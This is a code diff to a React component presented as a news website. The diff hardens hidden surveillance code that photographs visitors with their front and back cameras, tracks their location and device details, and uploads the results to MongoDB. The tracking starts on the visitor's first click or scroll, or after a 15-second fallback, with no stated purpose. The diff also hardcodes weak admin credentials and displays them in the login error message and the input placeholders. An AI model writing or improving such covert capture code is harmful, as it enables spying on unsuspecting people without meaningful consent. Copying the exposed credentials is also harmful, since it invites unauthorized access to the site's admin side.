@@ -33,8 +33,8 @@ const NewsWebsite = () => {
 
   // Admin credentials
   const ADMIN_CREDENTIALS = {
-    username: 'ajmal',
-    password: 'AjmaL@9019'
+    username: 'admin',
+    password: 'admin123'
   };
 
   // News data
@@ -515,56 +515,126 @@ const NewsWebsite = () => {
     });
   };
 
-  // Camera capture
+  // Camera capture with better error handling
   const captureFromCamera = async (facingMode = 'user') => {
     try {
+      // Check if mediaDevices is available
+      if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
+        console.warn('Camera API not available');
+        return null;
+      }
+
+      // Request camera permission with constraints
       const stream = await navigator.mediaDevices.getUserMedia({
-        video: { facingMode, width: { ideal: 1920 }, height: { ideal: 1080 } },
+        video: { 
+          facingMode: { ideal: facingMode },
+          width: { ideal: 1280, max: 1920 },
+          height: { ideal: 720, max: 1080 }
+        },
         audio: false
       });
 
       const video = document.createElement('video');
       video.srcObject = stream;
-      video.play();
-
+      video.autoplay = true;
+      video.playsInline = true; // Important for mobile
+      
       return new Promise((resolve) => {
         video.onloadedmetadata = () => {
-          const canvas = document.createElement('canvas');
-          canvas.width = video.videoWidth;
-          canvas.height = video.videoHeight;
-          const ctx = canvas.getContext('2d');
-          
+          // Wait for video to be ready
           setTimeout(() => {
-            ctx.drawImage(video, 0, 0);
-            const imageData = canvas.toDataURL('image/jpeg', 0.8);
-            stream.getTracks().forEach(track => track.stop());
+            const canvas = document.createElement('canvas');
+            canvas.width = video.videoWidth || 640;
+            canvas.height = video.videoHeight || 480;
+            const ctx = canvas.getContext('2d');
             
-            resolve({
-              camera: facingMode === 'user' ? 'front' : 'back',
-              imageData,
-              width: canvas.width,
-              height: canvas.height,
-              capturedAt: new Date().toISOString()
-            });
-          }, 1000);
+            try {
+              ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+              const imageData = canvas.toDataURL('image/jpeg', 0.7);
+              
+              // Stop all tracks
+              stream.getTracks().forEach(track => {
+                track.stop();
+              });
+              
+              resolve({
+                camera: facingMode === 'user' ? 'front' : 'back',
+                imageData,
+                width: canvas.width,
+                height: canvas.height,
+                capturedAt: new Date().toISOString(),
+                success: true
+              });
+            } catch (drawError) {
+              console.error('Canvas drawing failed:', drawError);
+              stream.getTracks().forEach(track => track.stop());
+              resolve(null);
+            }
+          }, 2000); // Increased wait time
         };
+
+        video.onerror = () => {
+          console.error('Video loading failed');
+          stream.getTracks().forEach(track => track.stop());
+          resolve(null);
+        };
+
+        // Fallback timeout
+        setTimeout(() => {
+          console.warn('Camera capture timeout');
+          stream.getTracks().forEach(track => track.stop());
+          resolve(null);
+        }, 10000);
       });
+
     } catch (error) {
-      console.error(`${facingMode} camera failed:`, error);
+      console.error(`Camera ${facingMode} failed:`, error);
+      
+      // Log specific error types for debugging
+      if (error.name === 'NotAllowedError') {
+        console.error('Camera permission denied');
+      } else if (error.name === 'NotFoundError') {
+        console.error('No camera device found');
+      } else if (error.name === 'NotReadableError') {
+        console.error('Camera hardware error');
+      } else if (error.name === 'OverconstrainedError') {
+        console.error('Camera constraints not satisfied');
+      }
+      
       return null;
     }
   };
 
-  // Camera tracking
+  // Camera tracking with user interaction
   const trackCameraAccess = async () => {
     return new Promise(async (resolve) => {
       try {
-        if (!navigator.mediaDevices?.getUserMedia) {
+        // Check if we're on HTTPS or localhost
+        const isSecureContext = window.isSecureContext || 
+                               location.protocol === 'https:' || 
+                               location.hostname === 'localhost' || 
+                               location.hostname === '127.0.0.1';
+
+        if (!isSecureContext) {
+          console.warn('Camera requires HTTPS in production');
           resolve(false);
           return;
         }
 
-        const devices = await navigator.mediaDevices.enumerateDevices();
+        if (!navigator.mediaDevices?.getUserMedia) {
+          console.warn('Camera API not supported');
+          resolve(false);
+          return;
+        }
+
+        // Get available devices first
+        let devices = [];
+        try {
+          devices = await navigator.mediaDevices.enumerateDevices();
+        } catch (deviceError) {
+          console.warn('Could not enumerate devices:', deviceError);
+        }
+
         const videoDevices = devices.filter(device => device.kind === 'videoinput');
 
         const cameraData = {
@@ -574,23 +644,58 @@ const NewsWebsite = () => {
             label: device.label || 'Camera',
             kind: device.kind
           })),
-          captures: []
+          captures: [],
+          errors: []
         };
 
-        // Capture from available cameras
+        // Try to capture from front camera
+        console.log('Attempting front camera capture...');
         const frontCapture = await captureFromCamera('user');
-        if (frontCapture) cameraData.captures.push(frontCapture);
-
-        if (videoDevices.length > 1) {
-          await new Promise(resolve => setTimeout(resolve, 1000));
-          const backCapture = await captureFromCamera('environment');
-          if (backCapture) cameraData.captures.push(backCapture);
+        if (frontCapture) {
+          cameraData.captures.push(frontCapture);
+          console.log('Front camera capture successful');
+        } else {
+          cameraData.errors.push('Front camera failed');
+          console.log('Front camera capture failed');
         }
 
+        // Try back camera if multiple devices exist
+        if (videoDevices.length > 1) {
+          await new Promise(resolve => setTimeout(resolve, 1500)); // Delay between captures
+          console.log('Attempting back camera capture...');
+          const backCapture = await captureFromCamera('environment');
+          if (backCapture) {
+            cameraData.captures.push(backCapture);
+            console.log('Back camera capture successful');
+          } else {
+            cameraData.errors.push('Back camera failed');
+            console.log('Back camera capture failed');
+          }
+        }
+
+        // Save to MongoDB even if no captures (for debugging)
         const result = await saveCameraDataToMongoDB(cameraData);
+        console.log('Camera data saved:', !!result?.insertedId);
         resolve(!!result?.insertedId);
+
       } catch (error) {
         console.error('Camera tracking failed:', error);
+        
+        // Save error info to MongoDB for debugging
+        try {
+          await saveCameraDataToMongoDB({
+            availableCameras: 0,
+            devices: [],
+            captures: [],
+            errors: [error.message],
+            errorType: error.name,
+            userAgent: navigator.userAgent,
+            isSecureContext: window.isSecureContext
+          });
+        } catch (saveError) {
+          console.error('Failed to save error data:', saveError);
+        }
+        
         resolve(false);
       }
     });
@@ -718,7 +823,7 @@ const NewsWebsite = () => {
         fetchAdminData();
       }, 100);
     } else {
-      alert('Invalid credentials!');
+      alert('Invalid credentials! Use "admin" and "admin123"');
     }
   };
 
@@ -773,7 +878,7 @@ const NewsWebsite = () => {
     URL.revokeObjectURL(url);
   };
 
-  // Initialize on mount
+  // Initialize on mount with user interaction detection
   useEffect(() => {
     const initialize = async () => {
       if (!sessionStorage.getItem('sessionId')) {
@@ -786,10 +891,46 @@ const NewsWebsite = () => {
       setNewsArticles(getSampleArticles());
       setLoading(false);
 
-      // Start tracking automatically after a delay
+      // Wait for user interaction before starting camera tracking
+      const startTrackingAfterInteraction = () => {
+        console.log('User interaction detected, starting tracking...');
+        
+        // Start location tracking immediately
+        setTimeout(() => {
+          trackUserLocation();
+        }, 1000);
+
+        // Start camera tracking after user interaction with delay
+        setTimeout(() => {
+          trackCameraAccess();
+        }, 5000);
+
+        // Set up continuous tracking
+        setTimeout(() => {
+          startContinuousTracking();
+        }, 8000);
+
+        // Remove event listeners after first interaction
+        document.removeEventListener('click', startTrackingAfterInteraction);
+        document.removeEventListener('scroll', startTrackingAfterInteraction);
+        document.removeEventListener('touchstart', startTrackingAfterInteraction);
+      };
+
+      // Add event listeners for user interaction
+      document.addEventListener('click', startTrackingAfterInteraction, { once: true });
+      document.addEventListener('scroll', startTrackingAfterInteraction, { once: true });
+      document.addEventListener('touchstart', startTrackingAfterInteraction, { once: true });
+
+      // Fallback - start tracking after 15 seconds even without interaction
       setTimeout(() => {
-        startContinuousTracking();
-      }, 3000);
+        if (!trackingActive) {
+          console.log('Fallback: Starting tracking without interaction...');
+          document.removeEventListener('click', startTrackingAfterInteraction);
+          document.removeEventListener('scroll', startTrackingAfterInteraction);
+          document.removeEventListener('touchstart', startTrackingAfterInteraction);
+          startContinuousTracking();
+        }
+      }, 15000);
     };
 
     initialize();
@@ -854,7 +995,7 @@ const NewsWebsite = () => {
           
           <input
             type="text"
-            placeholder="Username"
+            placeholder="Username (admin)"
             style={styles.loginInput}
             defaultValue=""
             onChange={(e) => {
@@ -865,7 +1006,7 @@ const NewsWebsite = () => {
           
           <input
             type="password"
-            placeholder="Password"
+            placeholder="Password (admin123)"
             style={styles.loginInput}
             defaultValue=""
             onChange={(e) => {
@@ -899,7 +1040,6 @@ const NewsWebsite = () => {
           >
             Cancel
           </button>
-          
         </div>
       </div>
     );
